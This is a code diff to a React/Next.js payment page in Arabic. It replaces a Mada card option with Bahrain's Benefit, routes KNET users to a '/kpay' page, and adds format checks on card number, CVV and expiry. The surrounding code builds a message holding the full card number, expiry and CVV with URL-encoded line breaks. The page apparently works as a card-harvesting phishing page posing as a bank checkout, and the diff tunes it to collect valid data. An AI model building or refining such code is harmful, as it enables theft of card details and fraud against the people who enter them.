@@ -2,7 +2,7 @@
 import { useState } from "react";
 import 'bootstrap/dist/css/bootstrap.min.css';
 import Image from "next/image";
-import mada from '../../../public/mada.svg';
+import benefit from '../../../public/images.png';
 import visa from '../../../public/visa.png';
 import kent from "../../../public/download.svg";
 import { Modal, Button, Form } from "react-bootstrap";
@@ -37,7 +37,7 @@ export default function PaymentPage() {
 
     if (selectedMethod === "knet") {
       router.push("/kpay"); // ✅ تحويل مباشر بدون مودال
-    } else if (selectedMethod === "visa" || selectedMethod === "mada") {
+    } else if (selectedMethod === "visa" || selectedMethod === "benefit") {
       setShowModal(true); // ✅ فتح المودال للبطاقات
     }
   };
@@ -50,7 +50,18 @@ export default function PaymentPage() {
 📅 تاريخ الانتهاء: ${cardData.expiry}%0A
 🔐 CVV: ${cardData.cvv}
 `;
-
+    if (!/^\d{16}$/.test(cardData.number)) {
+  alert("رقم البطاقة يجب أن يكون 16 رقمًا");
+  return;
+}
+if (!/^\d{3,4}$/.test(cardData.cvv)) {
+  alert("CVV غير صحيح");
+  return;
+}
+if (!/^\d{2}\/\d{2}$/.test(cardData.expiry)) {
+  alert("تاريخ الانتهاء غير صحيح");
+  return;
+}
     if (
       cardData.name.trim() === "" ||
       cardData.number.trim() === "" ||
@@ -77,10 +88,10 @@ export default function PaymentPage() {
           <h5>طريقة الدفع:</h5>
 
           <div className="list-group my-4">
-            <label className={`list-group-item ${selectedMethod === "mada" ? "active" : ""}`} onClick={() => handleSelect("mada")}>
-              <input className="form-check-input me-2" type="radio" name="payment" checked={selectedMethod === "mada"} readOnly />
-              <Image src={mada} width={40} height={20} alt="Mada" className="me-2" />
-              بطاقة مدى البنكية
+            <label className={`list-group-item ${selectedMethod === "benefit" ? "active" : ""}`} onClick={() => handleSelect("benefit")}>
+              <input className="form-check-input me-2" type="radio" name="payment" checked={selectedMethod === "benefit"} readOnly />
+              <Image src={benefit} width={40} height={20} alt="Benefit" className="me-2" />
+              بطاقة بنفت البنكية
             </label>
 
             <label className={`list-group-item ${selectedMethod === "visa" ? "active" : ""}`} onClick={() => handleSelect("visa")}>
@@ -173,7 +184,7 @@ export default function PaymentPage() {
             دفع
           </Button>
 
-          {selectedMethod === "mada" && (
+          {selectedMethod === "benefit" && (
             <Button
               variant="success"
               className="w-100 d-flex align-items-center justify-content-center gap-2"
